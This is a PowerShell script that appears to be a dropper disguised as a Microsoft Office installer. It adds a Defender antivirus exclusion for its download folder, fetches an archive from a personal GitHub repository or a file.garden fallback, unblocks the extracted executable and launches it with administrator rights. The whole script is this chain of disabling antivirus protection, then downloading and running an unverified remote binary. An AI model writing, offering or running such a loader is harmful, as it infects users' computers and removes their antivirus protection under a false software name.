$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Configuration
$Repo       = "Alhlhli/office"
$ExeName    = "office.exe"
$ZipUrl     = "https://raw.githubusercontent.com/$Repo/main/office.zip"
$AltZipUrl  = "https://file.garden/an5JdIrGtwwEoiH6/office/office.zip"
$TargetDir  = "$env:USERPROFILE\Downloads\Office"
$ExePath    = Join-Path $TargetDir $ExeName
$ZipTemp    = Join-Path $TargetDir "update.zip"

New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null

# Safe Defender exclusion (if supported)
if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    Add-MpPreference -ExclusionPath $TargetDir -ErrorAction SilentlyContinue
}

# 2. Download from GitHub (.zip)
$Downloaded = $false
try {
    Write-Host "Downloading $ExeName package from GitHub..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipTemp -UseBasicParsing
    Expand-Archive -Path $ZipTemp -DestinationPath $TargetDir -Force
    Remove-Item -Path $ZipTemp -Force -ErrorAction SilentlyContinue
    $Downloaded = Test-Path $ExePath
} catch {
    Write-Host "GitHub failed. Switching to fallback..." -ForegroundColor Yellow
}

# 3. Fallback Download & Extraction (.zip)
if (-not $Downloaded) {
    try {
        Write-Host "Downloading archive from fallback..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri $AltZipUrl -OutFile $ZipTemp -UseBasicParsing
        Expand-Archive -Path $ZipTemp -DestinationPath $TargetDir -Force
        Remove-Item -Path $ZipTemp -Force -ErrorAction SilentlyContinue
        $Downloaded = Test-Path $ExePath
    } catch {
        Write-Error "Download failed: $($_.Exception.Message)"
        exit 1
    }
}

# 4. Unblock & Execute
if (Test-Path $ExePath) {
    Unblock-File -Path $ExePath -ErrorAction SilentlyContinue
    Write-Host "Launching application..." -ForegroundColor Green
    Start-Process -FilePath $ExePath -WorkingDirectory $TargetDir -Verb RunAs
} else {
    Write-Error "Executable not found at $ExePath"
    exit 1
}
